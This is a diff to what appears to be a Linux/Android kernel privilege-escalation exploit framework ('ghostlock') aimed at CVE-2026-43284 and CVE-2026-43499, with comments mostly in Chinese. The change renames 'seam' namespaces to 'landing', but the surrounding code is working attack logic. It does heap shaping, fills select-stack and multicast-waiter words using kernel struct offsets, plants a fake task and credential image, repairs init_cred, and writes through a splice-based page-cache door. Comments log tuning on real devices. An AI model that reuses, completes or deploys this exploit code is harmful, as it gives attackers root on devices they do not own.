@@ -23,9 +23,9 @@
 #include <vector>
 
 #include "backend/cve_2026_43284/access_params.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
-#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
-#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
+#include "backend/cve_2026_43284/landing/real_splice_io.hpp"
 #include "backend/cve_2026_43284/session_frame.hpp"
 #include "backend/cve_2026_43499/leak/snitch_region.hpp"
 #include "pipeline/plan_gate.hpp"
@@ -39,13 +39,13 @@
 #include "backend/cve_2026_43499/steps/access_binder.hpp"
 #include "backend/cve_2026_43499/steps/discovery_runner.hpp"
 #include "backend/cve_2026_43499/steps/prepare_runner.hpp"
-#include "backend/cve_2026_43499/seam/multicast_route_linux.hpp"
+#include "backend/cve_2026_43499/landing/multicast_route_linux.hpp"
 /* `select_stack` 的 syscall 面：此处包含只为**让它进 android 构建** ✓（NDK 零告警门禁会真正编译它 ✓），
  *  尚未接线 ✗（选择器仍报 route-not-ported:select_stack ✓）。 */
-#include "backend/cve_2026_43499/seam/select_stack_route.hpp"
-#include "backend/cve_2026_43499/seam/select_stack_route_linux.hpp"
+#include "backend/cve_2026_43499/landing/select_stack_route.hpp"
+#include "backend/cve_2026_43499/landing/select_stack_route_linux.hpp"
 #include "backend/cve_2026_43499/memory/credential_image.hpp"
-#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
+#include "backend/cve_2026_43499/memory/heap_ops_linux.hpp"
 #include "backend/cve_2026_43499/memory/payload_page.hpp"
 #include "backend/cve_2026_43499/memory/page_slot.hpp"   /* 切片 2 ✓：修复页的一次性槽 ✓ */
 #include "backend/victim/victim_process.hpp"
@@ -991,12 +991,12 @@ namespace {
                     victim.retire_child();
                     return "shaping-fd-missing";
                 }
-                const cve49::memory::SeamResult sent = cve49::memory::LinuxHeapSeam::send_bytes(
+                const cve49::memory::OpsResult sent = cve49::memory::LinuxHeapOps::send_bytes(
                         prepared.shaping_fd, page_image.data(), page_image.size());
-                (void) cve49::memory::LinuxHeapSeam::close_fd(prepared.shaping_fd);
+                (void) cve49::memory::LinuxHeapOps::close_fd(prepared.shaping_fd);
                 /* 两端都关（发完就没用了；只留一端会让对端消失 ⇒ 先关会 SIGPIPE ✓）。 */
                 if (prepared.shaping_peer_fd >= 0) {
-                    (void) cve49::memory::LinuxHeapSeam::close_fd(prepared.shaping_peer_fd);
+                    (void) cve49::memory::LinuxHeapOps::close_fd(prepared.shaping_peer_fd);
                 }
                 std::printf("main: page sent value=%lld errno=%d bytes=%zu",
                             static_cast<long long>(sent.value), sent.error, page_image.size());
@@ -1080,7 +1080,7 @@ route_values.fake_task = page_inputs.fake_task;
                         out = value;
                     }
                 };
-                cve49::seam::SelectStackOffsets offsets{};
+                cve49::landing::SelectStackOffsets offsets{};
 read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word", offsets.head_word);
                 read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_next", offsets.head_next);
                 read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_prev", offsets.head_prev);
@@ -1093,7 +1093,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_prio", offsets.prio);
                 read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_deadline", offsets.deadline);
                 read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_ww_ctx", offsets.ww_ctx);
-                cve49::seam::SelectStackConfig select_config{};
+                cve49::landing::SelectStackConfig select_config{};
                 select_config.fd_count = 320U;
                 select_config.waiter_shift = -2;
                 select_config.compact = true;
@@ -1112,10 +1112,10 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 select_config.target = route_values.target;
                 select_config.value = route_values.value;   /* 同批回退（round 231 ✓） */
                 std::printf("main: sel-branch enter ✓");
-                const char *filled = cve49::seam::fill_select_stack_words(offsets, select_config);
+                const char *filled = cve49::landing::fill_select_stack_words(offsets, select_config);
                 if (filled != nullptr) { return filled; }
                 std::printf("main: sel-branch words filled ✓");
-                cve49::seam::SelectStackRoute<cve49::seam::SelectStackRouteLinux> select_route{
+                cve49::landing::SelectStackRoute<cve49::landing::SelectStackRouteLinux> select_route{
                         select_config};
                 /* 低编号 fd 取三个固定的低位（select 只要有可等的对象就会 park ✓）；
                  *  真正的取舍要看词表覆盖，属下一批 ✓。 */
@@ -1132,7 +1132,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 const char *select_refusal =
                         select_route.execute(words_region.spare(1), words_region.word(0), words_region.spare(0),
                                              selected_fds, 3U);
-                const cve49::seam::SelectStackReport select_report = select_route.report();
+                const cve49::landing::SelectStackReport select_report = select_route.report();
                 std::printf("main: select route status=%d step=%d attempts=%d calls=%d successes=%d lock=%d park=%d parkerrno=%d setattr=%d setterrno=%d refusal=%s",
                             select_report.status_code, select_report.status_step,
                             select_report.attempts, select_report.calls, select_report.successes,
@@ -1176,7 +1176,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 unported[at] = 0;
                 return unported;
             }
-            cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps> route{route_built.config};
+            cve49::landing::MulticastRoute<cve49::landing::LinuxRouteOps> route{route_built.config};
             report.step_region_bytes = route_values.buffer_size;
 
             /* 两个字与守卫都在这一层：字来自上面那块 region（同一个桶里），守卫是调用方持有的值对象。 */
@@ -1190,7 +1190,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
              *  模板了（用户裁定：编译期调用，见 docs/analysis/43499-plan-routeexec-compile-time.md）；
              *  本层持有具体路由 `route`（:1178 那件）⇒ 在这里点明它的类型。
              *  完成 = 三线门禁绿 ＋ 真机判据不变 ＋ 用户确认 ⇒ 删本标注。 */
-            cve49::steps::WindowStageContext<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>> stage_context{};
+            cve49::steps::WindowStageContext<cve49::landing::MulticastRoute<cve49::landing::LinuxRouteOps>> stage_context{};
             stage_context.chain = words_region.word(0);
             /* 改挂目标用**干净**的字：被队列锤过的字会被内核判 EAGAIN（真机量到过），
              *  所以目标必须是队列没碰过的那一批。 */
@@ -1210,12 +1210,12 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
              *  旧码：route_values.value 来自文档毒值 0x4141… ✗；新码：用 layout 算出的真值 ✓。 */
             stage_context.payload_value = route_values.value;
             /* ★★ 门面接管（2026-10-12 裁定「旧实现接入 kernel access」）：事实齐了就经 `Access` 落字 ——
-             *  `AccessSeam::land_word` ⇒ `MulticastWindow::write_word` ⇒ **先 warm-up（arm）再 execute** ✓
+             *  `WordLanding::land_word` ⇒ `MulticastWindow::write_word` ⇒ **先 warm-up（arm）再 execute** ✓
              *  （⇒ 引擎此前直调 `execute` ✗ 会**绕过 warm-up** ✗，而 `arm_sequence` 的注释逐字要求那些轮必须发生 ✓）。
              *  事实不全 ⇒ **不绑** ⇒ 引擎走具名回退 `stage_context.route` ✓（⇒ 行为与接线前一致，零回归 ✓）。 */
-            std::unique_ptr<cve49::MulticastWaiterAccess<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>>> access_owner;
+            std::unique_ptr<cve49::MulticastWaiterAccess<cve49::landing::MulticastRoute<cve49::landing::LinuxRouteOps>>> access_owner;
             {
-                cve49::steps::AccessBindInputs<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>> access_inputs{};
+                cve49::steps::AccessBindInputs<cve49::landing::MulticastRoute<cve49::landing::LinuxRouteOps>> access_inputs{};
                 access_inputs.exec = &route;
                 access_inputs.limits = &route_built.config.limits;
                 access_inputs.target.mm_struct = found.mm_struct;
@@ -1229,9 +1229,9 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                      *  ⇒ **制造了假矛盾** ✓ ⇒ 教训：日志必须在其所述事实**已经发生**之后 ✓）。 */
                     ghostlock::support::log("warn", "access -> route fallback");
                 } else {
-                    /* 正面读数（⇒ 让"绑成了"与"没执行到"可区分 ✓）：seam 非空才算真的接管 ✓。 */
-                    std::printf("main: access bound route=multicast_waiter seam=%d",
-                                stage_context.seam_landing != nullptr ? 1 : 0);
+                    /* 正面读数（⇒ 让"绑成了"与"没执行到"可区分 ✓）：landing 非空才算真的接管 ✓。 */
+                    std::printf("main: access bound route=multicast_waiter landing=%d",
+                                stage_context.landing_landing != nullptr ? 1 : 0);
                     ghostlock::support::log("info", "access -> facade takes the writes");
                 }
             }
@@ -1251,7 +1251,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
             const char *stage_refusal = cve49::steps::run_window_stage_with_attempt(
                     named_step, stage_request, stage_context);
             /* 引擎自己的报告（赢的判据与证据都在这里）：设备取证要看的就是这几个数。 */
-            const cve49::seam::MulticastRouteReport route_report = route.report();
+            const cve49::landing::MulticastRouteReport route_report = route.report();
             std::printf("main: route status=%d/%d clean=%d/%d attempts=%d calls=%d successes=%d "
                         "stamp=%d/%d requeue=%d waiter=%d owner=%d\n",
                         static_cast<int>(route_report.status.code),
@@ -1364,8 +1364,8 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                         /* ★ 归档第二行（第 105 轮 ✓）：退役 `w2_fast_repair_activate` 的激活点 ✓ */
                         std::printf("main: W1b: firing prebuilt init_cred+8 repair step=%s target=0x%llx",
                                     step.data(), static_cast<unsigned long long>(repair_target));
-                        const cve49::memory::SeamResult sent2 =
-                                cve49::memory::LinuxHeapSeam::send_bytes(prepared2.shaping_fd,
+                        const cve49::memory::OpsResult sent2 =
+                                cve49::memory::LinuxHeapOps::send_bytes(prepared2.shaping_fd,
                                                                          repair_page,
                                                                          repair_length);
                         std::printf("main: repair prepared base=0x%llx page=0x%llx sent=%lld/%d",
@@ -1373,9 +1373,9 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                                     static_cast<unsigned long long>(repair_base),
                                     static_cast<long long>(sent2.value),
                                     static_cast<int>(repair_verdict));
-                        (void) cve49::memory::LinuxHeapSeam::close_fd(prepared2.shaping_fd);
+                        (void) cve49::memory::LinuxHeapOps::close_fd(prepared2.shaping_fd);
                         if (prepared2.shaping_peer_fd >= 0) {
-                            (void) cve49::memory::LinuxHeapSeam::close_fd(prepared2.shaping_peer_fd);
+                            (void) cve49::memory::LinuxHeapOps::close_fd(prepared2.shaping_peer_fd);
                         }
                         /* ★ W2b 后半段：第二份配置 + 第二轮（退役 activate ✓）。 */
                         cve49::steps::RouteConfigValues repair_values = route_values;
@@ -1387,11 +1387,11 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                         const cve49::steps::RouteConfigOutcome repair_built =
                                 cve49::steps::build_route_config(repair_values);
                         if (repair_built.refusal == nullptr) {
-                            cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps> repair_route{
+                            cve49::landing::MulticastRoute<cve49::landing::LinuxRouteOps> repair_route{
                                     repair_built.config};
                             
                             /* 修复轮走**同一条窗口路径**（直接 execute 时消费者没赢 ⇒ status=2/61 ✗）。 */
-                            cve49::steps::WindowStageContext<cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps>> repair_stage{};
+                            cve49::steps::WindowStageContext<cve49::landing::MulticastRoute<cve49::landing::LinuxRouteOps>> repair_stage{};
                             repair_stage.chain = words_region.word(0);
                             repair_stage.target = words_region.spare(0);
                             repair_stage.window = &window_guard;
@@ -1407,7 +1407,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                                     static_cast<std::uint32_t>(report.step_stage_extra);
                             (void) cve49::steps::run_window_stage_with_attempt(
                                     named_step, repair_stage_request, repair_stage);
-                            const cve49::seam::MulticastRouteReport repair_report = repair_route.report();
+                            const cve49::landing::MulticastRouteReport repair_report = repair_route.report();
                             std::printf("main: repair route status=%d/%d attempts=%d calls=%d successes=%d",
                                         static_cast<int>(repair_report.status.code),
                                         static_cast<int>(repair_report.status.step),
@@ -1597,7 +1597,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
     }
 
     /** The script-side calls: counted, checked against what the wire declared, and refused by
-     *  name when this entry cannot honour them yet (no device seams in the host build). */
+     *  name when this entry cannot honour them yet (no device ops in the host build). */
     void on_op(void *context, const script::CallView *view) noexcept {
         auto *report = static_cast<RunReport *>(context);
         if (report == nullptr || view == nullptr || view->name == nullptr) { return; }
@@ -1608,7 +1608,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
              * level limited to debug and info: warn and error stay native, so a script cannot
              * write a line that looks like a refusal (design-critic M1 item 3). A wrong shape
              * or a level outside the subset is refused by the name already spelled here, and
-             * nothing is logged -- a script line is a line through the same seam as any other. */
+             * nothing is logged -- a script line is a line through the same landing as any other. */
             const bool shapes_ok = view->arg_count >= 2U &&
                                    view->args[0].kind == contract::ArgKind::Str &&
                                    view->args[1].kind == contract::ArgKind::Str;
@@ -1625,7 +1625,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
         if (name == "step") {
             /* The encapsulated steps: asked for by the name the wire declares
              *  (backend.<id>.steps), never by a list in here. The bodies are device work, so on a host
-             *  without the seam the honest answer is a named refusal. */
+             *  without the landing the honest answer is a named refusal. */
             if (view->arg_count < 2U || view->args[1].kind != contract::ArgKind::Str) { return; }
             const std::string_view step = view->args[1].str;
             /* 步的结论按**名字**原样报出来：脚本把它当返回值带走，这里不报就没人看得见。 */
@@ -1723,7 +1723,7 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 if (report->refusal == nullptr) { report->refusal = "write-target-missing"; }
                 return;
             }
-            ghostlock::backend::cve_2026_43284::seam::PageCacheDoorLinux door(carrier_path.data(), carrier_path.size());
+            ghostlock::backend::cve_2026_43284::landing::PageCacheDoorLinux door(carrier_path.data(), carrier_path.size());
             if (!door.usable()) {
                 if (report->refusal == nullptr) { report->refusal = "write-door-refused"; }
                 return;
@@ -1733,8 +1733,8 @@ read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word
                 if (report->refusal == nullptr) { report->refusal = "write-door-open-failed"; }
                 return;
             }
-            ghostlock::backend::cve_2026_43284::seam::RealSpliceIo write_io(ghostlock::backend::cve_2026_43284::seam::real_splice_io(), write_target_fd);
-            ghostlock::backend::cve_2026_43284::seam::PageCacheWrite write_window(door, write_io);
+            ghostlock::backend::cve_2026_43284::landing::RealSpliceIo write_io(ghostlock::backend::cve_2026_43284::landing::real_splice_io(), write_target_fd);
+            ghostlock::backend::cve_2026_43284::landing::PageCacheWrite write_window(door, write_io);
             /* SA 材料由会话帧给出（夹具的 required_param=["sa"] ✓）；没有就诚实报缺 ✓。 */
             if (report->sa == nullptr) {
                 if (report->refusal == nullptr) { report->refusal = "write-needs-sa"; }
